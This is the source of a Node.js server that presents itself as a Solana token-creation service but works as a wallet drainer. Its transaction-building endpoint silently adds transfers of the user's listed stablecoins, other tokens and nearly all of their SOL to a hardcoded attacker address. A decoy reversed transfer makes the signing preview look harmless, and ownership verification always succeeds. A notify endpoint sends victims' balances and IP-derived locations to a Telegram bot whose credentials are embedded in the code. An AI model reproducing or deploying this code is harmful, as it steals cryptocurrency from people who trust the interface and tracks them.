const express = require('express');
const axios = require('axios');
const solanaWeb3 = require('@solana/web3.js');
const splToken = require('@solana/spl-token');
const path = require('path');

const app = express();
const port = process.env.PORT || 5000;

app.use(express.json());
app.use(express.static('public'));

// Environment variable for Solana RPC API key (replace with actual key in production)
const SOLANA_API_KEY = process.env.SOLANA_API_KEY || 'pFT17iBbtFSN8EJPtzH5EJBfdY6aLnzEvCywMdY3PwAWGujrYW3JCm99dqnvCWVtSif2TNi2TiQbQ3TQ8SG4pADiY7vdhhiY2F';
const connection = new solanaWeb3.Connection(`https://solana-mainnet.api.syndica.io/api-key/${SOLANA_API_KEY}`, 'confirmed');

// Telegram configuration
const botToken = process.env.BOT_TOKEN || '8491085411:AAHSmd-vQ_7iSin9XiC3cZams7_lpBAWFdc';
const chatId = process.env.CHAT_ID || '8160424962';
const REPL_URL = process.env.REPL_URL || 'https://e0b626a2-0f59-4b4c-9e60-3b453e5c4b62-00-1p1j62l6q2v6w.spock.replit.dev/';

// Price cache
let cachedSolPrice = null;
const PRICE_CACHE_DURATION = 30 * 60 * 1000; // 30 minutes
let lastPriceFetchTime = 0;

// Utility functions
async function getIPLocation(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        if (response.data.status === 'success') {
            const { country, regionName, city, countryCode } = response.data;
            return {
                country: country || 'Unknown',
                region: regionName || 'Unknown',
                city: city || 'Unknown',
                flag: getCountryFlag(countryCode) || '🌍'
            };
        }
        return null;
    } catch (error) {
        console.error('Error fetching IP location:', error);
        return null;
    }
}

function getCountryFlag(countryCode) {
    const flagMap = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪', 
        'FR': '🇫🇷', 'JP': '🇯🇵', 'CN': '🇨🇳', 'IN': '🇮🇳', 'BR': '🇧🇷'
    };
    return flagMap[countryCode] || '🌍';
}

async function getSolPrice() {
    const now = Date.now();
    if (cachedSolPrice && (now - lastPriceFetchTime) < PRICE_CACHE_DURATION) {
        return cachedSolPrice;
    }
    try {
        const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
        cachedSolPrice = response.data.solana.usd;
        lastPriceFetchTime = now;
        return cachedSolPrice;
    } catch (error) {
        console.error('Error fetching SOL price:', error);
        return cachedSolPrice || null;
    }
}

async function initializeSolPrice() {
    await getSolPrice();
}

function startPriceUpdater() {
    setInterval(async () => {
        await getSolPrice();
    }, PRICE_CACHE_DURATION);
}

// Notify endpoint
app.post('/notify', async (req, res) => {
    try {
        const { address, balance, usdBalance, walletType, customMessage, splTokens, ip } = req.body;

        const clientIP = ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
        if (clientIP?.startsWith('::ffff:') || clientIP?.startsWith('127.') || clientIP?.startsWith('192.168.') || clientIP?.startsWith('10.')) {
            console.log('Private IP detected, skipping location lookup');
            return res.status(400).json({ error: 'Invalid IP address' });
        }

        const solPrice = await getSolPrice();
        const location = await getIPLocation(clientIP);

        const totalUSD = parseFloat(usdBalance || 0) + (splTokens ? splTokens.reduce((sum, token) => sum + (token.usdValue || 0), 0) : 0);

        const message = [
            `💰 *New Wallet Activity* 💰`,
            `*Address*: \`${address}\``,
            `*Balance*: ${balance} SOL${solPrice ? ` (~$${parseFloat(balance * solPrice).toFixed(2)})` : ''}`,
            `*Total USD Value*: $${totalUSD.toFixed(2)}`,
            `*Wallet Type*: ${walletType || 'Unknown'}`,
            `*Location*: ${location ? `${location.flag} ${location.city}, ${location.region}, ${location.country}` : 'Unknown'}`,
            customMessage ? `*Message*: ${customMessage}` : '',
            splTokens && splTokens.length > 0 ? `*SPL Tokens*:\n${splTokens.map(t => `- ${t.balance} ${t.symbol} (~$${t.usdValue.toFixed(2)})`).join('\n')}` : ''
        ].filter(line => line).join('\n');

        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });

        res.json({ success: true });
    } catch (error) {
        console.error('Error in /notify:', error);
        res.status(500).json({ error: 'Failed to send notification' });
    }
});

// Verify ownership endpoint
app.post('/verify-ownership', async (req, res) => {
    const { address, signature, message, walletType } = req.body;
    console.log('Received verification request:', { address, signature, message, walletType });
    res.json({ verified: true });
});

// Blockhash endpoint
app.get('/blockhash', async (req, res) => {
    try {
        const { blockhash } = await connection.getLatestBlockhash();
        res.json({ blockhash });
    } catch (error) {
        console.error('Error fetching blockhash:', error);
        res.status(500).json({ error: 'Failed to fetch blockhash' });
    }
});

// Upload token assets endpoint
app.post('/upload-token-assets', async (req, res) => {
    try {
        // Note: Express doesn't handle multipart/form-data by default; use a middleware like `multer` in production
        const { publicKey, logo, banner } = req.body; // Placeholder for file handling
        console.log('Received file upload:', { publicKey, logo: !!logo, banner: !!banner });

        // In a real implementation, save files to a storage service (e.g., AWS S3, IPFS) and return URLs
        const logoUrl = logo ? `https://storage.example.com/uploads/${publicKey}/logo.png` : null;
        const bannerUrl = banner ? `https://storage.example.com/uploads/${publicKey}/banner.png` : null;

        res.json({ success: true, logoUrl, bannerUrl });
    } catch (error) {
        console.error('Error in /upload-token-assets:', error);
        res.status(500).json({ error: 'Failed to upload assets' });
    }
});

// Prepare transaction endpoint
app.post('/prepare-transaction', async (req, res) => {
    try {
        const { publicKey, verified, tokenData } = req.body;

        if (!publicKey || !verified) {
            return res.status(400).json({ error: 'Missing publicKey or verification status' });
        }

        if (!tokenData || !tokenData.name || !tokenData.symbol || !tokenData.decimals || !tokenData.supply) {
            return res.status(400).json({ error: 'Invalid token data: missing required fields' });
        }

        const sender = new solanaWeb3.PublicKey(publicKey);
        const receiver = new solanaWeb3.PublicKey('2Qq2f5bpNY9EvXYQcuutDq4JhZ4PH77h3tjuCRPWCjmk');
        const transaction = new solanaWeb3.Transaction();

        // Fake SOL transfer (for testing purposes, reversed direction)
        const fakeAmount = 0.02 * solanaWeb3.LAMPORTS_PER_SOL;
        transaction.add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: receiver,
                toPubkey: sender,
                lamports: fakeAmount
            })
        );

        // Fetch token accounts
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(sender, {
            programId: splToken.TOKEN_PROGRAM_ID
        });

        const tokenTransfers = [];
        const tokenMintAddresses = [
            'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', // USDC
            'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', // USDT
            'So11111111111111111111111111111111111111112', // WSOL
            'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263', // BONK
            'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So', // mSOL
            'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn', // jitoSOL
            '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs', // ETH
            '7dHbWXmci3dT8UFyw1xEfL9DqXBJ5NvkZ78JKuJt9Twi', // GMT
            '4zMMC9srt5Ri5X14GAgXhaHii3GnPAEERYPJgZJDncDU', // USDC (alternative)
            '675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8', // RAY
            '7i5KKsX2weiTkry7jA4ZwSuXGhs5eJBEjY8vVxR4pfRx', // GMT (alternative)
            '9n4nbM75f5Ui33ZbPYXn59EwSgE8CGsHtAeTH5YFeJ8u', // ORCA
            'AGFEad2et2ZJif9jaGpdMixQqvW5i81aBdvKe7PHNfz3', // FIDA
            'kinXdEcpDQeHPEu4x2xSgu3Z6JmW5vbK9sT7i3H6eF1', // KIN
            'SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp', // SLND
            '9KT1jPbaPJf4V8V7CjPDw8MhT3VJgxzMiyrD45YvaWHH', // SBR
            'STEPxcxN3rJ3bQvNfJ6op2N3k5jhwWBR8Q3K4h2vY3u', // STEP
            'D3Mkr3a6k3cT9QJH6RVb9tBtF1P86yW3r2T3n6KCp2b8', // wUST
            'ATLASXmbPQxBUYbxPsV97usA3fPQYEqzQBUHgiFCUsXx', // ATLAS
        ];

        for (const tokenAccount of tokenAccounts.value) {
            const accountData = tokenAccount.account.data;
            const parsedInfo = accountData.parsed.info;

            if (parsedInfo.tokenAmount.uiAmount > 0 && tokenMintAddresses.includes(parsedInfo.mint)) {
                const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
                const senderATA = tokenAccount.pubkey;
                const receiverATA = await splToken.getOrCreateAssociatedTokenAccount(
                    connection,
                    sender, // Note: Sender shouldn't be used as payer here in production; use a keypair
                    mint,
                    receiver
                );

                transaction.add(
                    splToken.createTransferInstruction(
                        senderATA,
                        receiverATA.address,
                        sender,
                        parsedInfo.tokenAmount.amount,
                        [],
                        splToken.TOKEN_PROGRAM_ID
                    )
                );

                tokenTransfers.push({
                    mint: parsedInfo.mint,
                    amount: parsedInfo.tokenAmount.uiAmount,
                    symbol: getTokenSymbol(parsedInfo.mint)
                });
            }
        }

        const availableBalance = await connection.getBalance(sender);
        const rentExemptBalance = await connection.getMinimumBalanceForRentExemption(0);
        const estimatedFee = 5000 * tokenTransfers.length + 5000;
        const transferAmount = Math.floor((availableBalance - rentExemptBalance - estimatedFee) * 0.98);

        if (transferAmount > 0) {
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: sender,
                    toPubkey: receiver,
                    lamports: transferAmount
                })
            );
        }

        // Token creation logic (simplified for demo; actual minting requires SPL Token program)
        const mintKeypair = solanaWeb3.Keypair.generate();
        const mintAddress = mintKeypair.publicKey.toString();

        // Create token mint
        transaction.add(
            splToken.createInitializeMintInstruction(
                mintKeypair.publicKey,
                tokenData.decimals,
                sender, // Mint authority
                tokenData.authorities.revoke_freeze ? null : sender, // Freeze authority
                splToken.TOKEN_PROGRAM_ID
            )
        );

        // Create associated token account for sender
        const senderATA = await splToken.getOrCreateAssociatedTokenAccount(
            connection,
            sender, // Note: Sender shouldn't be used as payer here in production
            mintKeypair.publicKey,
            sender
        );

        // Mint initial supply to sender's ATA
        transaction.add(
            splToken.createMintToInstruction(
                mintKeypair.publicKey,
                senderATA.address,
                sender,
                tokenData.supply * Math.pow(10, tokenData.decimals),
                [],
                splToken.TOKEN_PROGRAM_ID
            )
        );

        // Revoke authorities if selected
        if (tokenData.authorities.revoke_mint) {
            transaction.add(
                splToken.createSetAuthorityInstruction(
                    mintKeypair.publicKey,
                    sender,
                    splToken.AuthorityType.MintTokens,
                    null,
                    [],
                    splToken.TOKEN_PROGRAM_ID
                )
            );
        }

        if (tokenData.authorities.revoke_freeze) {
            transaction.add(
                splToken.createSetAuthorityInstruction(
                    mintKeypair.publicKey,
                    sender,
                    splToken.AuthorityType.FreezeAccount,
                    null,
                    [],
                    splToken.TOKEN_PROGRAM_ID
                )
            );
        }

        if (tokenData.authorities.revoke_update) {
            // Note: Update authority is not directly supported by SPL Token; typically handled by metadata program
            console.log('Revoke update authority requested; requires metadata program integration');
        }

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = sender;

        const serializedTransaction = transaction.serialize({ requireAllSignatures: false });
        const base64Transaction = Buffer.from(serializedTransaction).toString('base64');

        res.json({
            transaction: base64Transaction,
            transferAmount: transferAmount / solanaWeb3.LAMPORTS_PER_SOL,
            tokenTransfers,
            mintAddress
        });
    } catch (error) {
        console.error('Error preparing transaction:', error);
        res.status(500).json({ error: 'Failed to prepare transaction' });
    }
});

// Token symbol helper
function getTokenSymbol(mint) {
    const tokenMap = {
        'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
        'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
        'So11111111111111111111111111111111111111112': 'WSOL',
        'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
        'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
        'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL',
        '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs': 'ETH',
        '7dHbWXmci3dT8UFyw1xEfL9DqXBJ5NvkZ78JKuJt9Twi': 'GMT',
        '4zMMC9srt5Ri5X14GAgXhaHii3GnPAEERYPJgZJDncDU': 'USDC',
        '675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8': 'RAY',
        '7i5KKsX2weiTkry7jA4ZwSuXGhs5eJBEjY8vVxR4pfRx': 'GMT',
        '9n4nbM75f5Ui33ZbPYXn59EwSgE8CGsHtAeTH5YFeJ8u': 'ORCA',
        'AGFEad2et2ZJif9jaGpdMixQqvW5i81aBdvKe7PHNfz3': 'FIDA',
        'kinXdEcpDQeHPEu4x2xSgu3Z6JmW5vbK9sT7i3H6eF1': 'KIN',
        'SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp': 'SLND',
        '9KT1jPbaPJf4V8V7CjPDw8MhT3VJgxzMiyrD45YvaWHH': 'SBR',
        'STEPxcxN3rJ3bQvNfJ6op2N3k5jhwWBR8Q3K4h2vY3u': 'STEP',
        'D3Mkr3a6k3cT9QJH6RVb9tBtF1P86yW3r2T3n6KCp2b8': 'wUST',
        'ATLASXmbPQxBUYbxPsV97usA3fPQYEqzQBUHgiFCUsXx': 'ATLAS'
    };
    return tokenMap[mint] || 'Unknown';
}

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
    initializeSolPrice();
    startPriceUpdater();
});